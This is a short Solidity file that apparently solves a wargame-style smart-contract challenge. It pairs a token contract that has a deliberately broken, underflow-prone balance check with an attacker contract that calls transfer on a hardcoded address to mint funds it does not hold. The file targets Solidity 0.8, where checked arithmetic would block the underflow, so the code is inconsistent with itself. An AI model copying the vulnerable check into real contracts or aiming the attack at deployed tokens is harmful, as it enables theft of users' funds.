// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Tolkein {
    Token public target = Token(0xCD3F3857076A2537FdAB3ecCE45C8501190452c1);

    function flowTransfer(address _to, uint256 _amount) external {
        bool succ = target.transfer(_to, _amount);
        require(succ, "Transfer Aborted, Failed On Target Contract Level");
    }

}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}